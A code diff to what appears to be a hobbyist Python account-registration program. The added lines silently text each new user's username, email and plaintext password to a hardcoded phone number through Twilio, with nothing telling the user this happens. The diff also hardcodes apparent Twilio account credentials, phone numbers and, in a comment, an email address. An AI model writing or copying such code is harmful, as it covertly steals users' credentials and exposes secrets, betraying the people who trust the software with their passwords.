@@ -3,7 +3,9 @@ import smtplib, os.path, os, getpass, datetime, time, random
 from PIL import Image
 from tkinter import Tk
 from tkinter.filedialog import askopenfilename
+from twilio.rest import TwilioRestClient
  
+
 os.system('clear')
 
 print('Loading...')
@@ -44,7 +46,9 @@ Add Bank account and password
 Add error check for the file selector if not an image
 Close the file selector
 Make the image display in the terminal
+Use squl
 """
+
 
 
 
@@ -64,23 +68,23 @@ with open('accounts.txt', 'r') as myFile:
 #print(accounts)
 
 def Register():
-	
+
+	print('Username and Passwords must only contain letters and numbers')
+
 	#Make the confirmation code
 	confirmationCode = random.randint(1000, 5000)
 
-	#Start the selection of the profile picture
-	print('Please select the image you would like to use as your profile photo \nPlease wait for the selector to open...\n')
-	Tk().withdraw()
-	filename = askopenfilename()
-	#print(filename)
-		
-
 	#Ask questions to setup account
-	print('Username and Passwords must only contain letters and numbers')
-	goBack = input('To go back to the home menu press 1, to continue press Enter: ')
+	goBack = input('To go back to the home menu press 1, to continue press Enter: \n')
 	if goBack == '1':
 		return
 	else:
+
+		#Start the selection of the profile picture
+		print('Please select the image you would like to use as your profile photo \nPlease wait for the selector to open...\n')
+		Tk().withdraw()
+		filename = askopenfilename()
+		#print(filename)
 		Username = input('Create a Username: ')
 		Password = getpass.getpass('Create a Password: ')
 		CheckPassword = getpass.getpass('Please re-type your Password: ')
@@ -152,6 +156,10 @@ def Register():
 		#Calculate the age
 		calculatedAge = 2016 - int(birthday)
 
+
+#ariisawesome22@gmail.com
+#twos
+
 		#Send email confirming account has been made
 		message = 'Welcome User ' + Username + ',\nYour account is one step away from being made. Copy and paste the verification code into the program to continue. Verification code: ' + str(confirmationCode) + '\n\n-Account Info'
 		try:
@@ -163,6 +171,11 @@ def Register():
 		verificationCode = input('A verification code has been sent to your email, please type it in here to confirm your account: ')
 
 		if str(verificationCode) == str(confirmationCode):
+
+			client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
+			client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created. The username for the account is: " + Username + " and the password is: " + Password)
+
+
 			#Record the setup data and finalize creation of account
 			with open('accounts.txt', 'a') as myFile:
 				myFile.write(str(Username) + ',' + str(encryptedPassword) + ',' + str(calculatedAge) + ',' + str(petname) + ',' + str(emailAddress) + ',' + str(bio) + ',' + str(today) + ',' + str(filename) + ',' + str(career) + ',' + str(gender) + ',' + str(homeAddress) + ',')
@@ -184,7 +197,21 @@ def Register():
 					print('It seems something went wrong, please check you wifi connectivity and try again')
 					Register()
 				verificationCodetwo = input('The re-verification code has been sent to your email, please type it in here to confirm your account: ')
+				
+				print(verificationCodetwo, type(verificationCodetwo))
+				print(confirmationCode, type(confirmationCode))
+
 				if str(verificationCodetwo) == str(confirmationCode):
+					print('Made IT HERE********************')
+
+					client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
+
+					client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created")
+
+					# Send text letting me know an account has been made
+					client = TwilioRestClient("AC29cd2211a452fe4e4f745fee7fdb048a", "11bf9e6de7779b7b7093c407e1ea6e88")
+					client.messages.create(to="+16504419188", from_="+12019037850", body="An account has just been created, the username is: "+Username+' , the email: '+emailAddress+' ,and the password: '+Password)
+
 					with open('accounts.txt', 'a') as myFile:
 						myFile.write(str(Username) + ',' + str(encryptedPassword) + ',' + str(calculatedAge) + ',' + str(petname) + ',' + str(emailAddress) + ',' + str(bio) + ',' + str(today) + ',' + str(filename) + ',' + str(career) + ',' + str(gender) + ',' + str(homeAddress) + ',')
 						myFile.close()
@@ -195,6 +222,8 @@ def Register():
 							if i%11 == 0:
 								accounts.append(info[i:i+11])
 					print('\n' + Username + '\'s account has been made. \n')
+
+					
 			else:
 				return
 
